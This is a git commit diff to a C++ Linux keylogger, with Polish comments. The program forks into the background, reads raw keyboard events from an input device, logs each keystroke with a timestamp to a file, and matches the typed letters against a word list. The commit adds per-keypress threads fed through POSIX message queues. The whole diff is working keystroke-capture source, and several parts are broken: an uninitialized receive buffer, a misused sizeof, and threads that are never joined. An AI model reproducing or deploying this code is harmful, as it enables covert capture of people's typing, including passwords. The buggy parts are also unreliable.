407337eb587474e91507ed9f2ac456bcbf89cda5
Quetz <quetz@laptop-quetz>
2014-06-06 01:28:22 +0200

    Dodanie wielowatkowosci - do sprawdzenia w praktyce

--- main.cpp
+++ main.cpp
@@ -18,21 +18,53 @@
 #include "tree.h"
 #include "treecheck.h"
 #include <vector>
- 
+#include <mqueue.h>
+#include <mutex>
+#include <list>
+#include <thread>
+
+std::mutex mutex;
+
+char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',
+					 ' ',' ',' ',' ','q','w','e','r','t','y','u','i',
+					 'o','p','[',']',' ',' ','a','s','d','f','g','h',
+					 'j','k','l',' ',' ',' ',' ',' ','z','x','c','v',
+					 'b','n','m',',','.','/' };
+
 void handler (int sig)
 {
   exit(0);
 }
- 
+
 void perror_exit()
 {
   handler(9);
 }
- 
+
+
 void init();
+void runChecker(FILE *data, Tree &tree, mqd_t id, const std::string &name);
 
 int main (int argc, char *argv[])
 {
+    /*using namespace std;
+
+    mqd_t mq;
+    struct mq_attr attr;
+    char buffer[1024 + 1];
+    int must_stop = 0;
+
+
+    attr.mq_flags = 0;
+    attr.mq_maxmsg = 10;
+    attr.mq_msgsize = 1024;
+    attr.mq_curmsgs = 0;
+
+
+    mq = mq_open("/test_queue", O_CREAT | O_RDONLY, 0644, &attr);
+    if((mqd_t)-1 == mq)
+        cout<<"BLAD!!"<<endl;*/
+
 
 	if (!fork())
 		init();
@@ -75,12 +107,6 @@ void printTime(FILE *data)
 void init() {
 	struct input_event ev[1];
 	int fd, rd, value, size = sizeof(struct input_event);
- 
-	char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',
-					 ' ',' ',' ',' ','q','w','e','r','t','y','u','i',
-					 'o','p','[',']',' ',' ','a','s','d','f','g','h',
-					 'j','k','l',' ',' ',' ',' ',' ','z','x','c','v',
-					 'b','n','m',',','.','/' };
 
 	std::string logPath;
 	std::string eventPath;
@@ -92,12 +118,12 @@ void init() {
 	slowa.push_back("sala");
 
 	Tree tree(slowa);
-	TreeCheck checker(&tree);	
+	//TreeCheck checker(&tree);
 
 	//Open Device
 	if ((fd = open (eventPath.c_str(), O_RDONLY)) == -1)
 		printf ("%s is not a vaild device.n", eventPath.c_str());
- 
+
 
 	FILE *data = fopen(logPath.c_str(), "w");
 
@@ -106,27 +132,129 @@ void init() {
 	fprintf(data, "-- session start --\n");
 	fflush(data);
 
-	while (1){
-		
+    //lista identyfikatorów kolejek
+    std::list<mqd_t> queueList;
+    srand (time(NULL));
+
+while (1)
+{
+
 		if ((rd = read (fd, ev, size * 1)) < size)
-			continue;     
- 
+			continue;
+
 		value = ev[0].code;
- 
-		if (ev[0].type == 1 && ev[0].value == 1) {
-	
+
+		if (ev[0].type == 1 && ev[0].value == 1)
+		{
+            //tworzenie randomowej nazwy - musi zaczynać się '/'
+            std::string qname = "/";
+            qname += std::to_string(rand());
+
+            //inicjalizacja struktury atrybutów dla kolejki
+            struct mq_attr attrib;
+            attrib.mq_flags = 0;
+            attrib.mq_maxmsg = 100;     //maksymalna ilość wiadomości w kolejce
+            attrib.mq_msgsize = 128;   //wielkość 1 wiadomości
+            attrib.mq_curmsgs = 0;
+
+            mqd_t id;   //id tworzonej kolejki
+
+            //metoda tworzaca kolejkę
+            id = mq_open(qname.c_str(), O_CREAT | O_RDWR, 0644, &attrib);
+
+            //jeśli brak błędu to dodaj kolejkę do listy
+            if((mqd_t)id != -1)
+                queueList.push_back(id);
+            //jeśli błąd wyświetl SZOP!!! (powinno się pojawić po kliknięciu przycisku/ w logach)
+            else
+            {
+                printf("SZOP!!!!");
+                fprintf(data, "ERROR : queueListError\n");
+                fflush(data);
+                return;
+            }
+
+            //tworzenie nowego wątku dla kolejnej literki
+            std::thread newThread(std::bind(runChecker,data,tree,id,qname));
+
+            if(!queueList.empty())
+            {
+                for(std::list<mqd_t>::iterator it=queueList.begin(); it!=queueList.end();)
+                {
+                    struct mq_attr attr;
+                    //sprawdzanie czy kolejka istnieje - jeśli tak to wysłanie klawisza; jeśli nie - usunięcie elementu
+                    if(mq_getattr(*it,&attr) != -1)
+                    {
+                        std::string msg = std::to_string(chars[value]);
+                        mq_send(*it, msg.c_str(),sizeof(msg.c_str()), 0);
+                        it++;
+                    }
+                    else
+                        it = queueList.erase(it);
+                }
+            }
+
+		}
+}
+
+
+
+//przed Quetzową zmianą tak wyglądał init:
+	/*while (1){
+
+		if ((rd = read (fd, ev, size * 1)) < size)
+			continue;
+
+		value = ev[0].code;
+
+		if (ev[0].type == 1 && ev[0].value == 1)
+		{
+
 			printTime(data);
 			fprintf(data, "%c :: %d\n", chars[value], value);
 			fflush(data);
-	
+
 			if(checker.checkNextLetter(chars[value])){
 				if(checker.isCurrentNodeTerminal()) {
 					printTime(data);
 					fprintf(data, "%s\n", checker.getFoundWord().c_str());
 					fflush(data);
 				}
-			}	
+			}
 
 		}
-	}
-} 
+	}*/
+}
+
+
+
+void runChecker(FILE *data, Tree &tree, mqd_t id,const std::string &name)
+{
+    TreeCheck checker(&tree);
+
+    while(1)
+    {
+        char* buff;
+        //odbieranie wiadomości z kolejki - jeśli nie ma - wątek zawiesza się w oczekiwaniu na nią
+        mq_receive(id, buff,sizeof(buff), 0);
+        int index = atoi(buff);
+
+        if(checker.checkNextLetter(chars[index]))
+        {
+            if(checker.isCurrentNodeTerminal())
+            {
+                mutex.lock();
+                printTime(data);
+                fprintf(data, "%s\n", checker.getFoundWord().c_str());
+                fflush(data);
+                mutex.unlock();
+            }
+        }
+        else
+        {
+            mq_close(id);   //zamykanie kolejki
+            mq_unlink(name.c_str());    //odłączanie kolejki
+            break;  //przerwanie pętli - koniec wątku
+        }
+    }
+}
--- makefile
+++ makefile
@@ -1,6 +1,6 @@
 CC    = g++
 FILES = main.cpp node.cpp tree.cpp treecheck.cpp
-FLAGS = -fpermissive -lpthread -lm -std=c++11
+FLAGS = -fpermissive -lpthread -lm -std=c++11 -lrt
 
 all:	
 	$(CC) -o keyLogger $(FILES) $(FLAGS) $(GTK_LIBS) $(GTK_FLAGS) 
